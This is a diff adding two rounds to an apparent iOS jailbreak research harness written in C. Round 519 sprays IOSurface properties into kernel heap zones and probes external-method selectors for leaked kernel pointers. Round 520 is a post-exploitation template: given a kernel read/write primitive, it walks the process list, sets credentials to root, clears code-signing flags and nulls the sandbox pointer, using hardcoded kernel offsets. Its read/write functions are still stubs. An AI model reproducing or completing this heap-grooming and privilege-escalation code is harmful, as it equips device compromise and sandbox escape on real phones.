@@ -32105,6 +32105,447 @@ r518_cleanup:
     rlog("\n=== Round 518 complete ===\n");
 }
 
+/* ============================================================
+ * Round 519: IOSurface property spray + info leak probe
+ *
+ * SAFE: No crash risk. Probes IOSurface external methods for
+ * kernel pointer leaks and tests property key/value spray
+ * into kalloc zones.
+ *
+ * IOSurface selectors:
+ *   0 = s_create_surface
+ *   1 = s_delete_surface  (or release)
+ *   6 = s_get_value / getValue
+ *   9 = s_set_value / setValue
+ *  10 = s_increment_use_count
+ *  11 = s_decrement_use_count
+ *  17 = s_get_property (new, iOS 26+)
+ *  18 = s_set_property
+ * ============================================================ */
+
+static void r519_iosurface_probe(void) {
+    rlog("=== Round 519: IOSurface property spray + info leak probe ===\n");
+    rlog("Goal: enumerate IOSurface selectors, test for kernel pointer leaks\n\n");
+
+    io_service_t service = IOServiceGetMatchingService(
+        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    if (!service) {
+        rlog("FAILED: IOSurfaceRoot service not found\n");
+        return;
+    }
+    rlog("IOSurfaceRoot service: 0x%x\n", service);
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+    IOObjectRelease(service);
+    if (kr != KERN_SUCCESS || !conn) {
+        rlog("FAILED: IOServiceOpen returned 0x%x\n", kr);
+        return;
+    }
+    rlog("IOSurface connection: 0x%x\n\n", conn);
+
+    /* Phase 1: Create a surface */
+    rlog("--- Phase 1: Create IOSurface ---\n");
+
+    char create_input[0x100];
+    memset(create_input, 0, sizeof(create_input));
+
+    /* Minimal IOSurface creation dict — encoded as IOKit serialized data */
+    /* Use IOSurfaceCreate with a dictionary instead */
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    int width = 32, height = 32, bpe = 4, bpr = 128;
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"),
+        CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &width));
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"),
+        CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &height));
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"),
+        CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe));
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"),
+        CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr));
+    int alloc_size = bpr * height;
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"),
+        CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc_size));
+
+    IOSurfaceRef surface = IOSurfaceCreate(props);
+    CFRelease(props);
+
+    if (!surface) {
+        rlog("FAILED: IOSurfaceCreate returned NULL\n");
+        IOServiceClose(conn);
+        return;
+    }
+
+    uint32_t surface_id = IOSurfaceGetID(surface);
+    rlog("Created IOSurface ID: %u\n", surface_id);
+    rlog("IOSurface base address: %p\n", IOSurfaceGetBaseAddress(surface));
+    rlog("IOSurface alloc size: %zu\n", IOSurfaceGetAllocSize(surface));
+
+    /* Phase 2: Probe selectors for info leaks */
+    rlog("\n--- Phase 2: Probe external method selectors ---\n");
+
+    uint64_t output_buf[64];
+    uint32_t output_cnt;
+
+    for (uint32_t sel = 0; sel < 40; sel++) {
+        memset(output_buf, 0x41, sizeof(output_buf));
+        output_cnt = 16;
+
+        uint64_t input_scalar[4] = { surface_id, 0, 0, 0 };
+        kr = IOConnectCallScalarMethod(conn, sel,
+            input_scalar, (sel == 6 || sel == 17) ? 2 : 1,
+            output_buf, &output_cnt);
+
+        if (kr == KERN_SUCCESS && output_cnt > 0) {
+            rlog("  Sel %2u: OK, %u outputs:", sel, output_cnt);
+            int has_kptr = 0;
+            for (uint32_t i = 0; i < output_cnt && i < 16; i++) {
+                rlog(" 0x%llx", output_buf[i]);
+                if (output_buf[i] >= 0xFFFFFFF000000000ULL &&
+                    output_buf[i] < 0xFFFFFFF100000000ULL) {
+                    has_kptr = 1;
+                }
+            }
+            if (has_kptr) rlog(" <<< KERNEL POINTER");
+            rlog("\n");
+        } else if (kr == KERN_SUCCESS) {
+            rlog("  Sel %2u: OK, 0 outputs\n", sel);
+        } else {
+            /* Only log interesting errors, skip simple "bad selector" */
+            if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                rlog("  Sel %2u: 0x%x\n", sel, kr);
+            }
+        }
+    }
+
+    /* Phase 3: Property spray — set key/value pairs to spray kalloc */
+    rlog("\n--- Phase 3: IOSurface property spray test ---\n");
+
+    int spray_count = 0;
+    for (int i = 0; i < 256; i++) {
+        char key[32];
+        snprintf(key, sizeof(key), "spray_%d", i);
+
+        /* Create a data blob of controlled size */
+        uint8_t val_data[256];
+        memset(val_data, 0x42 + (i & 0xF), sizeof(val_data));
+        /* Encode the index for later verification */
+        *(uint32_t *)val_data = (uint32_t)i;
+        *(uint32_t *)(val_data + 4) = 0xCAFEBABE;
+
+        CFStringRef cf_key = CFStringCreateWithCString(
+            kCFAllocatorDefault, key, kCFStringEncodingASCII);
+        CFDataRef cf_val = CFDataCreate(kCFAllocatorDefault, val_data, 256);
+
+        IOSurfaceSetValue(surface, cf_key, cf_val);
+        spray_count++;
+
+        CFRelease(cf_key);
+        CFRelease(cf_val);
+    }
+    rlog("Sprayed %d IOSurface properties (256 bytes each)\n", spray_count);
+    rlog("Total spray: %d bytes in kalloc.256 (or similar zone)\n", spray_count * 256);
+
+    /* Phase 4: Read back properties — check for corruption/leaks */
+    rlog("\n--- Phase 4: Property readback check ---\n");
+    int readback_ok = 0;
+    int readback_corrupt = 0;
+
+    for (int i = 0; i < 256; i++) {
+        char key[32];
+        snprintf(key, sizeof(key), "spray_%d", i);
+        CFStringRef cf_key = CFStringCreateWithCString(
+            kCFAllocatorDefault, key, kCFStringEncodingASCII);
+        CFTypeRef val = IOSurfaceCopyValue(surface, cf_key);
+        CFRelease(cf_key);
+
+        if (val && CFGetTypeID(val) == CFDataGetTypeID()) {
+            const uint8_t *data = CFDataGetBytePtr((CFDataRef)val);
+            CFIndex len = CFDataGetLength((CFDataRef)val);
+            if (len >= 8) {
+                uint32_t idx = *(const uint32_t *)data;
+                uint32_t magic = *(const uint32_t *)(data + 4);
+                if (idx == (uint32_t)i && magic == 0xCAFEBABE) {
+                    readback_ok++;
+                } else {
+                    readback_corrupt++;
+                    if (readback_corrupt <= 5) {
+                        rlog("  CORRUPT key spray_%d: idx=%u magic=0x%08x (expect %d/0xCAFEBABE)\n",
+                             i, idx, magic, i);
+                    }
+                }
+            }
+            CFRelease(val);
+        }
+    }
+    rlog("Readback: %d OK, %d corrupt\n", readback_ok, readback_corrupt);
+    if (readback_corrupt > 0) {
+        rlog(">>> IOSurface property CORRUPTION detected — heap manipulation possible <<<\n");
+    }
+
+    /* Phase 5: Try struct method calls for deeper probing */
+    rlog("\n--- Phase 5: Struct method probes ---\n");
+
+    uint8_t struct_input[0x200];
+    uint8_t struct_output[0x200];
+    size_t struct_output_size;
+
+    /* Selector 6 with struct: getValue — may leak kernel data */
+    memset(struct_input, 0, sizeof(struct_input));
+    *(uint32_t *)struct_input = surface_id;
+    struct_output_size = sizeof(struct_output);
+    memset(struct_output, 0, sizeof(struct_output));
+
+    kr = IOConnectCallStructMethod(conn, 6, struct_input, 0x10,
+                                    struct_output, &struct_output_size);
+    if (kr == KERN_SUCCESS && struct_output_size > 0) {
+        rlog("  Sel 6 struct: %zu bytes returned\n", struct_output_size);
+        /* Scan for kernel pointers */
+        for (size_t i = 0; i + 8 <= struct_output_size; i += 8) {
+            uint64_t val = *(uint64_t *)(struct_output + i);
+            if (val >= 0xFFFFFFF000000000ULL && val < 0xFFFFFFF100000000ULL) {
+                rlog("  >>> KERNEL POINTER at offset 0x%zx: 0x%llx <<<\n", i, val);
+            }
+        }
+    } else {
+        rlog("  Sel 6 struct: 0x%x (size=%zu)\n", kr, struct_output_size);
+    }
+
+    /* Selector 9 with struct: setValue */
+    memset(struct_input, 0, sizeof(struct_input));
+    *(uint32_t *)struct_input = surface_id;
+    *(uint32_t *)(struct_input + 4) = 0;  /* key index */
+    *(uint64_t *)(struct_input + 8) = 0xDEADCAFE00000000ULL; /* value */
+    struct_output_size = sizeof(struct_output);
+
+    kr = IOConnectCallStructMethod(conn, 9, struct_input, 0x18,
+                                    struct_output, &struct_output_size);
+    rlog("  Sel 9 struct (setValue): 0x%x (out=%zu)\n", kr, struct_output_size);
+
+    /* Cleanup */
+    rlog("\n--- Cleanup ---\n");
+    /* Remove sprayed properties */
+    for (int i = 0; i < 256; i++) {
+        char key[32];
+        snprintf(key, sizeof(key), "spray_%d", i);
+        CFStringRef cf_key = CFStringCreateWithCString(
+            kCFAllocatorDefault, key, kCFStringEncodingASCII);
+        IOSurfaceRemoveValue(surface, cf_key);
+        CFRelease(cf_key);
+    }
+
+    CFRelease(surface);
+    IOServiceClose(conn);
+
+    rlog("IOSurface released, connection closed\n");
+    rlog("\n=== Round 519 complete ===\n");
+}
+
+/* ============================================================
+ * Round 520: Post-exploitation credential patcher
+ *
+ * REQUIRES: Kernel R/W primitive (from earlier rounds)
+ * This round is a TEMPLATE — it won't run standalone.
+ * When we achieve kernel R/W, plug the read/write functions
+ * in and this does the actual jailbreak:
+ *   1. Find current proc by PID
+ *   2. Patch ucred (uid=0, gid=0)
+ *   3. Clear CS flags (CS_HARD|CS_KILL|CS_RESTRICT)
+ *   4. Set CS_VALID|CS_PLATFORM
+ *   5. Null sandbox pointer
+ *   6. Create /var/jb marker
+ *
+ * Offsets from asuka4scape (need re-verification on 27.1):
+ *   task->bsd_info     = 0x410
+ *   proc->ucred        = 0x28
+ *   proc->task         = 0x08
+ *   proc->csflags      = 0x2B8
+ *   proc->sandbox      = 0x3C0
+ *   proc->p_pid        = 0x60
+ *   ucred->cr_uid      = 0x18
+ * ============================================================ */
+
+#define POST_TASK_BSD_INFO    0x410
+#define POST_PROC_UCRED       0x28
+#define POST_PROC_TASK        0x08
+#define POST_PROC_CSFLAGS     0x2B8
+#define POST_PROC_SANDBOX     0x3C0
+#define POST_PROC_PID         0x60
+#define POST_UCRED_CR_UID     0x18
+#define POST_UCRED_CR_RUID    0x1C
+#define POST_UCRED_CR_SVUID   0x20
+#define POST_UCRED_CR_GID     0x24
+#define POST_UCRED_CR_RGID    0x28
+#define POST_CS_VALID     0x00000001
+#define POST_CS_HARD      0x00000100
+#define POST_CS_KILL      0x00000200
+#define POST_CS_RESTRICT  0x00000800
+#define POST_CS_PLATFORM  0x04000000
+
+/* Placeholder kernel R/W — replace with real primitive */
+static uint64_t (*kread64_fn)(uint64_t addr) = NULL;
+static uint32_t (*kread32_fn)(uint64_t addr) = NULL;
+static void (*kwrite64_fn)(uint64_t addr, uint64_t val) = NULL;
+static void (*kwrite32_fn)(uint64_t addr, uint32_t val) = NULL;
+
+static uint64_t kread64_placeholder(uint64_t addr) {
+    rlog("  [STUB] kread64(0x%llx) — no kernel R/W available\n", addr);
+    return 0;
+}
+static uint32_t kread32_placeholder(uint64_t addr) {
+    rlog("  [STUB] kread32(0x%llx) — no kernel R/W available\n", addr);
+    return 0;
+}
+static void kwrite64_placeholder(uint64_t addr, uint64_t val) {
+    rlog("  [STUB] kwrite64(0x%llx, 0x%llx) — no kernel R/W available\n", addr, val);
+}
+static void kwrite32_placeholder(uint64_t addr, uint32_t val) {
+    rlog("  [STUB] kwrite32(0x%llx, 0x%08x) — no kernel R/W available\n", addr, val);
+}
+
+static void r520_credential_patch(void) {
+    rlog("=== Round 520: Post-exploitation credential patcher ===\n");
+    rlog("Offsets: asuka4scape (iOS 27.0b6/A15 — need re-verification for 27.1)\n\n");
+
+    if (!kread64_fn) kread64_fn = kread64_placeholder;
+    if (!kread32_fn) kread32_fn = kread32_placeholder;
+    if (!kwrite64_fn) kwrite64_fn = kwrite64_placeholder;
+    if (!kwrite32_fn) kwrite32_fn = kwrite32_placeholder;
+
+    pid_t my_pid = getpid();
+    rlog("My PID: %d\n", my_pid);
+    rlog("My UID: %d\n\n", getuid());
+
+    /* Step 1: We need kernel_task address — from KASLR bypass + known offset */
+    rlog("--- Step 1: Locate kernel_task ---\n");
+    /* GHIDRA_KTASK_GLOBAL from asuka4scape: 0xFFFFFFF00AC54000 + slide */
+    rlog("kernel_task global (pre-slide): 0x%llx\n", (uint64_t)0xFFFFFFF00AC54000ULL);
+    rlog("NOTE: Need slide from Round 516 KASLR bypass\n");
+
+    /* For now, demonstrate the flow with stubs */
+    uint64_t slide = 0; /* Will come from round 516 */
+    uint64_t ktask_global = 0xFFFFFFF00AC54000ULL + slide;
+    uint64_t kernel_task = kread64_fn(ktask_global);
+    if (!kernel_task) {
+        rlog("Cannot read kernel_task — kernel R/W not available yet\n");
+        rlog("This round is a TEMPLATE. Plug in kread/kwrite when available.\n\n");
+
+        rlog("--- Dry-run: showing what WOULD happen ---\n");
+        rlog("1. Read kernel_task from 0x%llx + slide\n", (uint64_t)0xFFFFFFF00AC54000ULL);
+        rlog("2. Walk proc list: kernel_task->bsd_info (+0x%x)\n", POST_TASK_BSD_INFO);
+        rlog("3. For each proc: read proc->p_pid (+0x%x), compare to %d\n",
+             POST_PROC_PID, my_pid);
+        rlog("4. Found our proc → read proc->ucred (+0x%x)\n", POST_PROC_UCRED);
+        rlog("5. Set ucred->cr_uid (+0x%x) = 0\n", POST_UCRED_CR_UID);
+        rlog("6. Set ucred->cr_ruid (+0x%x) = 0\n", POST_UCRED_CR_RUID);
+        rlog("7. Set ucred->cr_svuid (+0x%x) = 0\n", POST_UCRED_CR_SVUID);
+        rlog("8. Set ucred->cr_gid (+0x%x) = 0\n", POST_UCRED_CR_GID);
+        rlog("9. Set ucred->cr_rgid (+0x%x) = 0\n", POST_UCRED_CR_RGID);
+        rlog("10. Read proc->csflags (+0x%x)\n", POST_PROC_CSFLAGS);
+        rlog("11. Clear CS_HARD|CS_KILL|CS_RESTRICT, set CS_VALID|CS_PLATFORM\n");
+        rlog("12. Read proc->sandbox (+0x%x)\n", POST_PROC_SANDBOX);
+        rlog("13. Write 0 to proc->sandbox (escape sandbox)\n");
+        rlog("14. Verify: getuid() == 0, can write to /var/jb\n");
+        rlog("15. Install Sileo bootstrap\n\n");
+
+        rlog("SPTM note: SPTM protects page tables and code-signing pages\n");
+        rlog("           but does NOT protect proc/ucred structures.\n");
+        rlog("           Kernel R/W alone suffices for credential patching.\n");
+
+        rlog("\n=== Round 520 complete (DRY RUN) ===\n");
+        return;
+    }
+
+    /* Real path — only reached when kernel R/W is plugged in */
+    rlog("kernel_task: 0x%llx\n", kernel_task);
+
+    uint64_t kernel_proc = kread64_fn(kernel_task + POST_TASK_BSD_INFO);
+    rlog("kernel proc (bsd_info): 0x%llx\n", kernel_proc);
+
+    /* Walk proc list to find our process */
+    rlog("\n--- Step 2: Find our proc by PID ---\n");
+    uint64_t cur_proc = kernel_proc;
+    uint64_t my_proc = 0;
+    int proc_count = 0;
+
+    while (cur_proc && proc_count < 2000) {
+        uint32_t pid = kread32_fn(cur_proc + POST_PROC_PID);
+        if (pid == (uint32_t)my_pid) {
+            my_proc = cur_proc;
+            rlog("Found our proc at 0x%llx (PID %d)\n", cur_proc, pid);
+            break;
+        }
+        uint64_t task = kread64_fn(cur_proc + POST_PROC_TASK);
+        if (!task) break;
+        uint64_t next_bsd = kread64_fn(task + POST_TASK_BSD_INFO);
+        if (next_bsd == cur_proc || !next_bsd) break;
+        cur_proc = next_bsd;
+        proc_count++;
+    }
+
+    if (!my_proc) {
+        rlog("FAILED: Could not find our proc in proc list\n");
+        rlog("\n=== Round 520 complete (FAILED) ===\n");
+        return;
+    }
+
+    /* Step 3: Patch credentials */
+    rlog("\n--- Step 3: Patch ucred (root) ---\n");
+    uint64_t ucred = kread64_fn(my_proc + POST_PROC_UCRED);
+    rlog("ucred: 0x%llx\n", ucred);
+
+    uint32_t old_uid = kread32_fn(ucred + POST_UCRED_CR_UID);
+    rlog("Current cr_uid: %u\n", old_uid);
+
+    kwrite32_fn(ucred + POST_UCRED_CR_UID, 0);
+    kwrite32_fn(ucred + POST_UCRED_CR_RUID, 0);
+    kwrite32_fn(ucred + POST_UCRED_CR_SVUID, 0);
+    kwrite32_fn(ucred + POST_UCRED_CR_GID, 0);
+    kwrite32_fn(ucred + POST_UCRED_CR_RGID, 0);
+
+    rlog("Verify: getuid() = %d\n", getuid());
+
+    /* Step 4: Patch CS flags */
+    rlog("\n--- Step 4: Patch CS flags ---\n");
+    uint32_t csflags = kread32_fn(my_proc + POST_PROC_CSFLAGS);
+    rlog("Original csflags: 0x%08x\n", csflags);
+
+    uint32_t new_csflags = csflags;
+    new_csflags &= ~(POST_CS_HARD | POST_CS_KILL | POST_CS_RESTRICT);
+    new_csflags |= POST_CS_VALID | POST_CS_PLATFORM;
+
+    kwrite32_fn(my_proc + POST_PROC_CSFLAGS, new_csflags);
+    rlog("New csflags: 0x%08x\n", new_csflags);
+
+    /* Step 5: Escape sandbox */
+    rlog("\n--- Step 5: Sandbox escape ---\n");
+    uint64_t sandbox = kread64_fn(my_proc + POST_PROC_SANDBOX);
+    rlog("Sandbox pointer: 0x%llx\n", sandbox);
+    kwrite64_fn(my_proc + POST_PROC_SANDBOX, 0);
+    rlog("Sandbox pointer nulled\n");
+
+    /* Step 6: Verify jailbreak */
+    rlog("\n--- Step 6: Verify ---\n");
+    rlog("UID: %d (expect 0)\n", getuid());
+    rlog("GID: %d (expect 0)\n", getgid());
+
+    /* Try creating /var/jb marker */
+    int fd = open("/var/jb", O_CREAT | O_WRONLY | O_TRUNC, 0755);
+    if (fd >= 0) {
+        const char *marker = "jailbroken by kaioh research\n";
+        write(fd, marker, strlen(marker));
+        close(fd);
+        rlog("/var/jb marker created — JAILBREAK SUCCESSFUL\n");
+    } else {
+        rlog("/var/jb creation failed: %s\n", strerror(errno));
+        rlog("May need remount or additional patches\n");
+    }
+
+    rlog("\n=== Round 520 complete ===\n");
+}
+
 static void aks_kaslr_probe(void) {
     rlog("=== CVE-2026-65343: AppleKeyStore OOB read → KASLR probe ===\n\n");
 
@@ -103155,6 +103596,18 @@ new_modes:
             rlog("*** rounds=485: CVE-2026-112477 adapted + SurfHeist + property race ***\n\n");
             fflush(stdout);
             r484_exploit();
+            goto done;
+        }
+        if (rounds == 520) {
+            rlog("*** rounds=520: Post-exploitation credential patcher ***\n\n");
+            fflush(stdout);
+            r520_credential_patch();
+            goto done;
+        }
+        if (rounds == 519) {
+            rlog("*** rounds=519: IOSurface property spray + info leak probe ***\n\n");
+            fflush(stdout);
+            r519_iosurface_probe();
             goto done;
         }
         if (rounds == 518) {
